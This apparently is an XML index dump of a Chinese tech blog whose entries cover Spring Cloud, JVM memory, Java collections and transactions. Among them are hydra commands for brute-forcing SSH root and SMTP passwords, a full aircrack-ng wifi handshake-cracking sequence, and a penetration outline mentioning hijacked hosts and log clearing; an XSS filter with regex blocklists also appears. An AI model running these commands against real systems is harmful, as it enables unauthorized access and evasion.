    <content type="text"><![CDATA[zuul 是架设在整个springcloud微服务服务网中的门户模块所有的外界访问请求 都要经过 这个模块zuul结合eureka 可以做到动态服务代理 实现功能： 1、身份验证和安全性-识别每个资源的身份验证要求并拒绝不满足的要求 2、洞察和检测-在边缘跟踪有意义的数据和统计数据、以便为我们提供准确的生产视图 3、动态路由-根据需要将请求动态路由到不同的后端集群 4、压力测试-逐渐增加到群集的流量，以衡量表现 5、加载Shedding-为每种类型的请求分配容量，并删除超出限制的请求 6、静态响应处理-直接边缘建立响应、而不是将他们转发到内部群集 7、多区域弹性-跨AWS区域的路由请求、以使我们的ELB使用多样化、并使我们的边缘更接近我们的成员 12345组件包含：zuul-core ：包含编译和执行过滤器的核心功能的库zuul-simple-webapp ：它显示了如何用zuul-core 构建一个应用程序的简单例子zuul-netflix ： 将其他NetflixOSS组件添加到Zuul的库 使用功能区来执行路由请求zuul-netflix-webapp ：webapp 把zuul-core 和 zuul-netflix 组合成一个 易于使用的软件包 官方架构]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring Roo]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fspring-roo%2F</url>
    <content type="text"><![CDATA[what？ 使用命令行形式构建项目 下载地址：https://projects.spring.io/spring-roo/#running-from-shell 快速搭建：12345678910111213141516mkdir hellocd helloroo.shroo&gt; project setup --topLevelPackage com.fooroo&gt; jpa setup --provider HIBERNATE --database HYPERSONIC_IN_MEMORYroo&gt; entity jpa --class ~.domain.Timerroo&gt; field string --fieldName message --notNullroo&gt; repository jpa --allroo&gt; service --allroo&gt; web mvc setuproo&gt; web mvc view setup --type THYMELEAFroo&gt; web mvc controller --all --responseType THYMELEAFroo&gt; web mvc controller --all --pathPrefix /apiroo&gt; quitmvn spring-boot:run]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器已经关闭]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud-exception%2Fexception-1%2F</url>
    <content type="text"><![CDATA[spring cloud task 启动报错 context has been closed already 解决办法 12345671.5.2 版本ok2.0.0 报错容器已关闭解决办法#spring.cloud.task.closecontext_enabled=false spring cloud Ribbon 解决办法 写到启动类就行 1234567891011121314spring boot &lt;= 1.3无需定义spring boot &gt;= 1.4springboot不在维护 需要自己定义RestTempalte@Beanpublic RestTemplate restTemplate (RestTemplateBuilder builder)&#123; //Do any additional configuration here return builder.build();&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cloud feign灵异事件]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud-exception%2Ffeign-exception-1%2F</url>
    <content type="text"><![CDATA[12报错 ：Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &apos;dataSourceInitializerPostProcessor&apos;: Unsatisfied dependency expressed through field &apos;beanFactory&apos;; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name &apos;com.****.feign.UserCenterFeignService&apos;: Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [org.springframework.cloud.netflix.feign.FeignClientFactoryBean] from ClassLoader [sun.misc.Launcher$AppClassLoader@61e4705b] 解决办法 加入依赖 1234原因未明 、创建项目时候导入了feign使用@EnableFeignClients注解 也ok 不报错 我就以为 feign包导入了 结果不知道哪来的包来的这个注解 导致 灵异事件` 1234严重怀疑是这个包里的mmp 莫名其妙的好了 仿佛又回到从前你对java 一无所知......]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sleuth灵异事件]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud-exception%2Fsleuth-exception-1%2F</url>
    <content type="text"><![CDATA[分布式 服务跟踪系统 客户端发送ok server端 启动ok但是就是没有数据 12345678灵异原因：可能是版本不一致要保证 客户端 cloud version和sleuth server cloud version 版本一致修改方式：`]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个HTTP请求究竟发生了什么]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-1%2F</url>
    <content type="text"><![CDATA[这个问题 去年 分析过一次 1、首先 请求从浏览器出发2、到达 服务器 nginx3、nginx分发给 各个服务容器 tomcat4、tomcat 把请求发给 服务系统5、服务 接收请求 由前端控制器 struts 或者 springmvc 接收6、进行业务控制 service7、获取业务数据 dao层 查询db 并返回 数据8、数据 反向 dao —-service—controller9、最后由springmvc 返回 不经历nginx 返回到浏览器 那么今年 结合新了解的 服务 更新这个列表 首先建立连接 【tcp ip 协议 】1、三次握手 【过程】2、经过的信息 源地址 ip 发送 一个请求连接包 到 目标地址3、目标服务器 接收到信息 返回数据包 表明连接成功 可以继续发送请求 请求建立后 发送 https请求服务服务会先到 目标地址的linux服务器linux 先到网卡网卡把请求 发给 linux端口服务如果还有LVS负载均衡服务等服务、会把请求发送给负载服务器如果没有LVS服务器 那么服务进入nginx等应用层负载均衡服务nginx服务分发给各个端口 端口内是真是服务的地址 如果有docker容器 要进入docker容器 进入docker容器 再进入服务实例服务实例 有springmvc 接收请求调用service服务【会有服务调用】服务调用有RPC框架【dubbo或者 eureka等等】service 调用dao 【这里还有java 底层】 从service说吧服务进入service那么要在虚拟机开辟一块新内存 用户内容存储和业务执行开辟方法 是调用的Cc指针开辟空间 把业务逻辑代码 转为 二进制数据 然后cpu 执行【关于CPU】学过计算机或者单片机的应该都了解cpu 单片机 也是个简单的cpu 只能执行一些较为简单的逻辑控制 一般cpu不都讲由多少多少亿个晶体管构成吗 、其实蛮复杂的、一个个数起来都得好几年吧、何况是按一定的方法方式排列到一起 能够执行起来 跑偏了在dubbo或者eureka中还会有netty nio aio bio问题由于了解不全面 这块就不写了 还有数据库，并发访问量，事务，存储过程。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[技术发展]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-0%2F</url>
    <content type="text"><![CDATA[从qq的点对点通信到微博的多人群聊话题到电商 人类进化就有的课题–交易交易的大量订单促使了–数据分析数据分析的性能要求–出现了云计算云计算的产生又引发了–人工智能【人工智能就是根据数据分析做出一个合理的判断、大概模式就是 从一个大的数据库里寻找最合理的返回答案】 那么下一个阶段是什么？]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里证书]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-100%2F</url>
    <content type="text"><![CDATA[阿里编码规范 阿里API服务调用 阿里网站部署 阿里mysql]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>阿里证书</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[技术负责人应有的几项要求]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-2%2F</url>
    <content type="text"><![CDATA[1、把控进度2、把控风险3、任务分发【开发量分配】4、需求分析、需求拆解【功能可实现性功能实现周期预估】、需求合理性判断5、技术过关【架构、细节、各个组件的选型】]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Filter安全过滤高级最终行（XSS攻击）]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Ffilter-xss%2F</url>
    <content type="text"><![CDATA[package com.what21.filter.xss; import java.io.IOException;import java.util.LinkedHashMap;import java.util.Map; import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletRequest; public class XSSFilter implements Filter { // XSS处理Map private static Map&lt;String,String&gt; xssMap = new LinkedHashMap&lt;String,String&gt;(); public void init(FilterConfig filterConfig) throws ServletException { // 含有脚本： script xssMap.put(&quot;[s|S][c|C][r|R][i|C][p|P][t|T]&quot;, &quot;&quot;); // 含有脚本 javascript xssMap.put(&quot;[\\\&quot;\\\&apos;][\\s]*[j|J][a|A][v|V][a|A][s|S][c|C][r|R][i|I][p|P][t|T]:(.*)[\\\&quot;\\\&apos;]&quot;, &quot;\&quot;\&quot;&quot;); // 含有函数： eval xssMap.put(&quot;[e|E][v|V][a|A][l|L]\\((.*)\\)&quot;, &quot;&quot;); // 含有符号 &lt; xssMap.put(&quot;&lt;&quot;, &quot;&amp;lt;&quot;); // 含有符号 &gt; xssMap.put(&quot;&gt;&quot;, &quot;&amp;gt;&quot;); // 含有符号 ( xssMap.put(&quot;\\(&quot;, &quot;(&quot;); // 含有符号 ) xssMap.put(&quot;\\)&quot;, &quot;)&quot;); // 含有符号 &apos; xssMap.put(&quot;&apos;&quot;, &quot;&apos;&quot;); // 含有符号 &quot; xssMap.put(&quot;\&quot;&quot;, &quot;\&quot;&quot;); } public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { // 强制类型转换 HttpServletRequest HttpServletRequest httpReq = (HttpServletRequest)request; // 构造HttpRequestWrapper对象处理XSS HttpRequestWrapper httpReqWarp = new HttpRequestWrapper(httpReq,xssMap); // chain.doFilter(httpReqWarp, response); } public void destroy() { } } =============================package com.what21.filter.xss; import java.util.Map;import java.util.Set; import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletRequestWrapper; public final class HttpRequestWrapper extends HttpServletRequestWrapper { private Map&lt;String, String&gt; xssMap; public HttpRequestWrapper(HttpServletRequest request) { super(request); } public HttpRequestWrapper(HttpServletRequest request, Map&lt;String, String&gt; xssMap) { super(request); this.xssMap = xssMap; } @Override public String[] getParameterValues(String parameter) { String[] values = super.getParameterValues(parameter); if (values == null) { return null; } int count = values.length; // 遍历每一个参数，检查是否含有 String[] encodedValues = new String[count]; for (int i = 0; i &lt; count; i++) { encodedValues[i] = cleanXSS(values[i]); } return encodedValues; } @Override public String getParameter(String parameter) { String value = super.getParameter(parameter); if (value == null) { return null; } return cleanXSS(value); } public String getHeader(String name) { String value = super.getHeader(name); if (value == null) return null; return cleanXSS(value); } /** * 清除恶意的XSS脚本 * * @param value * @return */ private String cleanXSS(String value) { Set&lt;String&gt; keySet = xssMap.keySet(); for(String key : keySet){ String v = xssMap.get(key); value = value.replaceAll(key,v); } return value; } } ============================================================================= XSSFilter com.what21.filter.xss.XSSFilter XSSFilter /*]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh远程登陆破解]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fssh-violence%2F</url>
    <content type="text"><![CDATA[利用ssh协议 暴力破解ssh密码 12345#hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 sshssh 端口22 破解# hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp邮箱破解 现在都加了许多验证.怕是不太靠谱了]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[总结]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-3%2F</url>
    <content type="text"><![CDATA[梳理一下脑子里的东西按点整理一下 消息中间件，ActiveMQ.Kafka.ZeroMQ.RabbitMQ.RocketMQ 服务治理Dubbo.eureka. 服务网springcloud cpu线程 docker容器 负载均衡lvs radware nginx keepalived 端口转发，网卡驱动 jvm内存 . 堆.栈 规则 一个线程会占用掉多少内存.一个对象会占用多少内存 javac 编译后文件 字节码文件 数据库mysql.alisql.oracle (并发.事物.存储过程) Nosql.redis.memcached.ecache.mongdb 算法、负载均衡算法，缓存淘汰算法，排序算法，数据整理算法 uml设计.部署图，流程图，ER图，时序图。 搜索引擎 权限架构 IO:AIO BIO NIO 消息流 Netty 怎么讲呢 今年大脑经历了大量信息的冲击.有些东西可能会很快忘记.留下的只有感悟.经验 123456789101112131415161718192021222324总结.构建知识体系.分流:负载均衡(软硬件).算法(随机.权重.最小调用).软件:nginx.vortex.radware硬件:LVS.F5缓存: Redis. Memcached. Mongdb. ehcache问题:缓存击穿.缓存同步并发.线程.数据库:mysql.AliSQL容量.并发线程.事物提交.存储过程java基本功.io.util.sql.主流中间件:RPC:dubbo. eureka消息中间件rocketmq.rabbitmq.zeromq.技术架构:springcloud服务架构:SOA 1234567891011121314渗透:1.基本工具使用比如wifi劫持.https劫持.session劫持.1.5.网站探测:whois.钟馗之眼.2.跳点搭建.vpn.或者直接控制肉鸡进行跳点3.主机扫描.漏洞扫描.关注国家网络安全网发布的漏洞.4.脚本攻击.shell脚本 python脚本5.日志清除. 今日起 关注人工智能、进军人工智能。以备将来使用。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[列表List]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-list%2F</url>
    <content type="text"><![CDATA[jdk8 ： vector arraylist都是 object[]也就是数组 linkedlist 是 node first ；node last也就是链表 另外arraylist中包含sort方法 是可排序的 vector扩展 是double 倍数扩展 关于数据结构想到这么一种描述方式： 种菜的园子 1、【数组】数据结构、茄子、土豆、冬瓜、南瓜 对应【int string boolean double ..】 我们规划一个园子、自然要分成一块块去种植不同的蔬菜【存放不同的数据】 **提取数据分类方式【数组】** 2、种菜不可避免的规则、一个萝卜一个坑、坑的位置就是数组的坐标、 左边第一排 从上往下数第二个、这个就是坐标、你姥姥让你去摘个茄子、总会让你告诉你摘哪一个、 有人会说了、他会让我采摘根据大小去采摘、那么成了数据的排序了 3、关于链表 链表有三个元素【上一个节点位置、下一个节点位置、本节点存数据】 清晰明了的现实对照物-----还是举例菜园子吧 菜园子分块种着不同的蔬菜、茄子、土豆、冬瓜、南瓜、北瓜、依次种植 那么我们从进出来看、对于人的认知、 茄子右边是土豆 土豆左边是茄子、右边是南瓜 ...一次类推 我们想摘个北瓜吃、就去菜园子里找北瓜的那一块、 我们可以从左往右找，也可从右往左找 这个找的过程就是【链表查找】 【单向链表、双向列表】 有人将我一眼就看到了那块是北瓜地、你忽略了你大脑为了处理你看到的视觉信息处理的过程]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高并发]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-4%2F</url>
    <content type="text"><![CDATA[分布式，服务SOA，集群 建个好的表结构，降低业余逻辑代码量，因为多一行代码，多一份危险，简单到极致的增删改最最能抗住高并发的 申明:spring cloud 1.0 就经过了千万级别用户洗礼才发布的]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集合Map]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-map%2F</url>
    <content type="text"><![CDATA[Java Map 集合类简介 【关键点】map的hash冲突 Map 处理这些冲突的方法是在索引位置处插入一个链接列表，并简单地将元素添加到此链接列表 123456789101112131415161718192021222324252627282930313233public Object put(Object key, Object value) &#123; //我们的内部数组是一个 Entry 对象数组 //Entry[] table; //获取哈希码，并映射到一个索引 int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % table.length; //循环遍历位于 table[index] 处的链接列表，以查明 //我们是否拥有此键项 — 如果拥有，则覆盖它 for (Entry e = table[index] ; e != null ; e = e.next) &#123; //必须检查键是否相等，原因是不同的键对象 //可能拥有相同的哈希 if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; //这是相同键，覆盖该值 //并从该方法返回 old 值 Object old = e.value; e.value = value; return old; &#125; &#125; //仍然在此处，因此它是一个新键，只需添加一个新 Entry //Entry 对象包含 key 对象、 value 对象、一个整型的 hash、 //和一个指向列表中的下一个 Entry 的 next Entry //创建一个指向上一个列表开头的新 Entry， //并将此新 Entry 插入表中 Entry e = new Entry(hash, key, value, table[index]); table[index] = e; return null;&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线程]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-thread%2F</url>
    <content type="text"><![CDATA[线程四种单线程 固定数目线程 缓存线程 定时线程 关于线程: 1.线程并不是越多越好.切换线程的开销很大、如果线程太多、切换时间远大于执行时间就得不偿失了 2.线程该用才用.跟事物一样.不该用不要用.否则反而降低性能 3.线程池数量 差不多是 CPU核数 * 2 4.阿里编码规范已不推荐使用ExcutorService方法使用线程1234567【强制】线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。说明：Executors 返回的线程池对象的弊端如下：1）FixedThreadPool 和 SingleThreadPool:允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。2）CachedThreadPool 和 ScheduledThreadPool:允许的创建线程数量为 Integer.MAX_VALUE，可能会创建大量的线程，从而导致 OOM。 代码地址:https://gitee.com/none_heart/xingchen/tree/master/excutor]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集合Set]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-set%2F</url>
    <content type="text"><![CDATA[结合set 底层实现方式是map 算是一次封装使用 既保证数据只能存放单个数据 又使用到了map的特性 hash 链表结构 关键点 把value 作为key 存放到map中 而value值 则存放了一个 空object // Dummy value to associate with an Object in the backing Mapprivate static final Object PRESENT = new Object(); 那么这么做 就使set 拥有了不同于 map的特性 比如 treemap 可重复 可排序 就变成了 不可重复但是 由于链表形式 可排序 hashSet 与 hashMap 一样都是无序 linkedHashSet 与 linkedHashMap 一样 保证插入顺序 与输出顺序一致 treeSet 和 treeMap 默认 取key的hash值以升序排列数据]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事务]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-translation%2F</url>
    <content type="text"><![CDATA[事务：用来保证几个操作一致性12345678 事务必须服从ISO/IEC所制定的ACID原则。ACID是原子性（atomicity）、一致性（consistency）、隔离性 （isolation）和持久性（durability）的缩写。事务的原子性表示事务执行过程中的任何失败都将导致事务所做的任何修改失效。一致性表示 当事务执行失败时，所有被该事务影响的数据都应该恢复到事务执行前的状态。隔离性表示在事务执行过程中对数据的修改，在事务提交之前对其他事务不可见。持 久性表示已提交的数据在事务执行失败时，数据的状态都应该正确。 简单理解就是 保证一组sql语句的执行完整性、要么全部成功、要么全部失败由于不同的业务环境对事物有不同的要求、通常把事物写到java程序中来控制sql语句通知db环境。默认情况下是一条语句一个事物执行的 java.sql.Connection 中提供了对于事物的控制方法1234public void setAutoCommit(boolean)public boolean getAutoCommit()public void commit()public void rollback() JDBC的事务支持 JDBC对事务的支持体现在三个方面： 1.自动提交模式(Auto-commit mode) Connection提供了一个auto-commit的属性来指定事务何时结束。 a.当auto-commit为true时，当每个独立SQL操作的执行完毕，事务立即自动提交，也就是说每个SQL操作都是一个事务。 一个独立SQL操作什么时候算执行完毕，JDBC规范是这样规定的： 对数据操作语言(DML，如insert,update,delete)和数据定义语言(如create,drop)，语句一执行完就视为执行完毕。 对select语句，当与它关联的ResultSet对象关闭时，视为执行完毕。 对存储过程或其他返回多个结果的语句，当与它关联的所有ResultSet对象全部关闭，所有update count(update,delete等语句操作影响的行数)和output parameter(存储过程的输出参数)都已经获取之后，视为执行完毕。 b. 当auto-commit为false时，每个事务都必须显示调用commit方法进行提交，或者显示调用rollback方法进行回滚。auto-commit默认为true。 JDBC提供了5种不同的事务隔离级别，在Connection中进行了定义。 2.事务隔离级别(Transaction Isolation Levels)1234567891011JDBC定义了五种事务隔离级别：TRANSACTION_NONE JDBC驱动不支持事务TRANSACTION_READ_UNCOMMITTED 允许脏读、不可重复读和幻读。TRANSACTION_READ_COMMITTED 禁止脏读，但允许不可重复读和幻读。TRANSACTION_REPEATABLE_READ 禁止脏读和不可重复读，单运行幻读。TRANSACTION_SERIALIZABLE 禁止脏读、不可重复读和幻读。 3.保存点(SavePoint)1234JDBC定义了SavePoint接口，提供在一个更细粒度的事务控制机制。当设置了一个保存点后，可以rollback到该保存点处的状态，而不是rollback整个事务。Connection接口的setSavepoint和releaseSavepoint方法可以设置和释放保存点。 JDBC规范虽然定义了事务的以上支持行为，但是各个JDBC驱动，数据库厂商对事务的支持程度可能各不相同。如果在程序中任意设置，可能得不到想要的效果。为此，JDBC提供了DatabaseMetaData接口，提供了一系列JDBC特性支持情况的获取方法。比如，通过DatabaseMetaData.supportsTransactionIsolationLevel方法可以判断对事务隔离级别的支持情况，通过DatabaseMetaData.supportsSavepoints方法可以判断对保存点的支持情况。 与事务相关的理论12345678910111213141516171819202122232425262728291.事务(Transaction)的四个属性(ACID)原子性(Atomic) 对数据的修改要么全部执行，要么全部不执行。一致性(Consistent) 在事务执行前后，数据状态保持一致性。隔离性(Isolated) 一个事务的处理不能影响另一个事务的处理。持续性(Durable) 事务处理结束，其效果在数据库中持久化。2.事务并发处理可能引起的问题脏读(dirty read) 一个事务读取了另一个事务尚未提交的数据，不可重复读(non-repeatable read) 一个事务的操作导致另一个事务前后两次读取到不同的数据幻读(phantom read) 一个事务的操作导致另一个事务前后两次查询的结果数据量不同。举例：事务A、B并发执行时，当A事务update后，B事务select读取到A尚未提交的数据，此时A事务rollback，则B读到的数据是无效的&quot;脏&quot;数据。当B事务select读取数据后，A事务update操作更改B事务select到的数据，此时B事务再次读去该数据，发现前后两次的数据不一样。当B事务select读取数据后，A事务insert或delete了一条满足A事务的select条件的记录，此时B事务再次select，发现查询到前次不存在的记录(&quot;幻影&quot;)，或者前次的某个记录不见了。 转载地址github相关使用整理]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wifi破解]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fwifi-violence%2F</url>
    <content type="text"><![CDATA[利用网卡监控模式监控wifi热点 .然后强制断开用户与路由连接.利用用户与路由四次握手机会获取握手包.然后跑字典 12345678910111213141516171819# airmon-ng# airmon-ng start wlan0#wlan0为 上一个命令的Interface# airodump-ng wlan0mon# airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon-c 6:表示信道6 (ch)# aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon# airmon-ng stop wlan0mon# aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap#跑字典]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jvm内存回收]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjvm-memory-recovery%2F</url>
    <content type="text"><![CDATA[回收区域：堆【主要区域】、方法区【回收废弃常量、无用类】 无用类定义：1、jvm中不存在该实例2、加载该类classLoader已被回收3、任何地方都不存在引用 回收算法：1、标记清除2、标记整理3、复制4、分代收集 回收器：单线程1、serial2、serial old多线程1、parNew2、parallel scavenge3、parallel old4、cms5、G1 回收新生代serial、parNew、parallel scavenge 回收老年代cms、serial old、parallel old 分代收集 G1 serial最老、也是默认回收算法、单线程缺点：暂定所有用户进程来回收垃圾、每一小时有五分钟不能给用户提供服务优点: 简单高效适合场景、clent模式 ParNewserial多线程版本场景：参考serial 多核处理器 Parallel scavenge1、复制算法2、目标、回收达到一个可控的吞吐量【吞吐量=运行代码时间/（运行代码时间+GC时间）】3、吞吐量优先收集器 serial old1、单线程、标记整理算法2、serial 老版本3、jdk1.5之前配合Parallel scavenge、cms后备预案 parallel old1、Parallel scavenge老版本2、标记整理算法3、注重吞吐量以及CPU资源敏感场景、使用Parallel scavenge ++ parallel old4、吞吐量优先 CMS1、标记清除2、目标：最短回收停顿时间3、四个步骤：初始标记、并发标记、重新标记、并发清除 G11、1.7HotSpot重要进化特征2、优点：并行并发、分代收集、空间整合【标记整理】、可预测停顿3、四个步骤：初始标记、并发标记、最终标记、筛选回收]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jvm内存结构]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjvm-memory-structure%2F</url>
    <content type="text"><![CDATA[jvm内存 一条线线程共享 线程不共线【也叫非线程共享】 线程共享： 堆【Heap】、 方法区【method area】非线程共享： 程序计数器、虚拟机栈、本地方法栈 方法区还包含 运行时常量池【类常量数据】 12345异常：jvm中定义两种异常 StackOverflow、outofmemory一种是栈溢出 一种是内存溢出官方定义栈溢出：线程请求深度大于虚拟机允许深度、抛出StackOverflow官方定义内存溢出：java内存扩展、当虚拟机申请不到足够的内存、抛出outofmemory jvm堆细分：新生代、老年代【分代收集算法】再细分：Eden、From Survivor、To Survivor空间再内存分配黑可以分出多个线程私有的分配缓冲区存放内容：对象实例、细致的划分只是为了更好的回收堆是回收主要区域 jvm方法区1、线程共享2、存储已被虚拟机加载、类信息、常量、静态变量、即时编译器编译后的代码数据 jvm运行时常量池1、方法区一部分2、存放编译期生成各种字面量和符号引用、 直接内存1、不属于jvm运行时数据取一部分 再五大板块外、2、jdk1.4中 引入NIO、引用了一种基于通道（channel）与缓冲区（Buffer）的IO方式、它可以使用Native函数库直接分配对外内存、然后通过一个存储再java堆中的DirectByteBuffer对象来作为这一块内存引用、来进行操作、避免了java堆和native堆中来回复制数据3、该内存受限于 操作系统和物理内存 虚拟机栈1、虚拟机执行java程序使用栈 本地方法栈1、执行native方法使用栈 程序计数器1、与c交界点、一个线程一个程序计数器、内存耗费较小、记录执行指针]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jvm内存一条线路]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjvm-total%2F</url>
    <content type="text"><![CDATA[入手从collection开始1234567891011121314151617181920212223242526272829集合常用 arrayList 底层数据结构 object[] 数组特点 内存连续 数据挨个存放 那么删除中间一个时候 后面的数据会挨个往前挪移 因为地址可知 查询节点数据 较快 通过下标获取应对业务场景 插入后查询修改数据 如果执行删除操作会造成资源浪费 需要时间重新规划数组结构linkedList 底层数据结构链表链表特点 内存不连续 代码 node first、 last； object；存放前后节点hash值【待查询】 然后跟节点对象 该链表实现 Deque 接口，为 add、poll 提供先进先出队列操作，以及其他堆栈和双端队列操作。应对业务场景 插入后 可能会删除某项数据 以作数据调整hashMap内存结构是hash散列 【我理解为 散着放的列表】 内存特点 hash值分桶存储【其实就一一小块内存】 当hash值冲突 会在该桶内维护一个链表警告：暂时不晓得这个桶有多大 所以尽量避免hash冲突 万一桶满了是不是要重新规划内存 造成资源浪费？linkedHashMap 内存特点 与hashMap一致不同点 linkedHashMap 额外维护了一个双重链表来记录数据插入的顺序性那么相比较hashMap 多了一个链表要维护 性能要有所下降 【业务需要 没办法】treeMap内存结构 红黑二叉树内存特点：位置 对于二叉树还没搞明白 只晓得父红子黑【还不知道对不对】 说到数据内存 就要讲讲内存结构 12345678910111213141516jvm内存分为五大块【程序计数器、虚拟机栈、本地方法栈、方法区、堆】从线程是否共享分起： 线程共享：堆、方法区/非线程共享：程序计数器、虚拟机栈、本地方法栈简单说下存储信息1、程序计数器 用于存放下一条指令所在单元的地址的地方 【c与java的交界点用以存放执行指针】2、虚拟机栈 【为java方法提供服务】3、本地方法栈【为jvm提供使用native方法服务】4、方法区 【存储类常量、静态变量等信息】5、堆 【存放对象实例、对象成员变量】对于一个obj：类引用--stack中类成员变量--Heap中【回收主要地方】类静态变量、常量--Method Area中类方法--以帧栈形式保存到栈中 那么内存存储规划完 就得看看 内存的回收机制12345随便一查 就能查到 四种算法：标记清除、标记整理、复制、分代收集那么实现这些算法的回收器：仔细查查有六种 ：Serial收集器【串行】、parNew收集器【并行】、Parallel Scavenge收集器 【并行】Serial Old收集器 【串行】、Parallel Old 收集器 【并行】、cms收集器 差不多 回收完成 然后就是 jvm的执行优化1优化方向 对回收进行控制【减小回收频率】 设定堆栈大小、新生代老年代大小等等、很多很多 那么总结完成之后这一条内存线路就算差不多了 算一条知识线路 貌似还没有 创建….[尴尬笑]]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS负载均衡]]></title>
    <url>%2F2018%2F03%2F24%2Fload-balance%2Fdns%2F</url>
